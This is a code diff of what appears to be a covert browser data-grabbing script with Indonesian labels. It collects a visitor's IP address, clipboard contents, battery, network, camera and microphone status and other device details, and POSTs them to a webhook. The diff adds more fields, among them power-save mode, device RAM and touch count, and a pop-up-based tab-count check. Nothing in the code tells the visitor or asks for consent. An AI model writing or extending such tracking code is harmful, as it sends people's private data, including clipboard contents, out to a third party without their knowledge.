@@ -20,20 +20,18 @@
                 if (navigator.connection) {
                     connectionType = navigator.connection.effectiveType || "Unknown";
                     networkType = navigator.connection.type || "Unknown";
-
-                    if (navigator.connection.downlinkMax > 10) {
-                        networkType = "WiFi";
-                    } else if (navigator.connection.downlinkMax > 0) {
-                        networkType = "Data Seluler";
-                    }
+                    if (navigator.connection.downlinkMax > 10) networkType = "WiFi";
+                    else if (navigator.connection.downlinkMax > 0) networkType = "Data Seluler";
                 }
 
                 let batteryLevel = "Unknown";
                 let isCharging = "Unknown";
+                let powerSaveMode = "Unknown";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     batteryLevel = `${Math.round(battery.level * 100)}%`;
                     isCharging = battery.charging ? "Charging" : "Not Charging";
+                    powerSaveMode = battery.saving ? "Enabled" : "Disabled";
                 }
 
                 const userAgent = navigator.userAgent;
@@ -65,13 +63,19 @@
                     }
                 }
 
-                if (navigator.getGamepads) {
-                    gamepadStatus = "Enabled";
-                }
+                if (navigator.getGamepads) gamepadStatus = "Enabled";
 
                 const inputType = 'ontouchstart' in window ? "Layar Sentuh" : "Keyboard Fisik";
-                const uptime = performance.now() / 1000;
-                const tabCount = window.length || "Unknown";
+                const uptime = (performance.now() / 1000).toFixed(2) + " detik";
+
+                let tabCount = "Unknown";
+                try {
+                    window.open("", "_blank").close();
+                    tabCount = window.length;
+                } catch {
+                    tabCount = "Permission Denied";
+                }
+
                 const cacheStorage = 'caches' in window ? "Supported" : "Not Supported";
 
                 let clipboardContent = "Disabled";
@@ -87,22 +91,16 @@
                 }
 
                 let lightSensor = "Not Supported";
-
-                // Coba menggunakan DeviceLightEvent
                 if ('ondevicelight' in window) {
                     window.addEventListener('devicelight', (event) => {
                         lightSensor = `${event.value} lux`;
                     });
                 } else {
                     try {
-                        // Coba AmbientLightSensor jika ada
                         if ('AmbientLightSensor' in window) {
                             const sensor = new AmbientLightSensor();
                             sensor.addEventListener('reading', () => {
                                 lightSensor = `${sensor.illuminance} lux`;
-                            });
-                            sensor.addEventListener('error', () => {
-                                lightSensor = "Sensor Error";
                             });
                             sensor.start();
                         }
@@ -111,13 +109,20 @@
                     }
                 }
 
+                const deviceRAM = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not Supported";
+
+                let fingerCount = "Unknown";
+                window.addEventListener("touchstart", (event) => {
+                    fingerCount = event.touches.length;
+                });
+
                 await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime.toFixed(2)} seconds\nOpen Tabs Estimate: ${tabCount}\nCache Storage: ${cacheStorage}\nClipboard Content: ${clipboardContent}\nLight Sensor: ${lightSensor}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPower Save Mode: ${powerSaveMode}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime}\nTab Count: ${tabCount}\nCache Storage: ${cacheStorage}\nClipboard Content: ${clipboardContent}\nLight Sensor: ${lightSensor}\nDevice RAM: ${deviceRAM}\nFinger Count: ${fingerCount}`
                     })
                 });
 
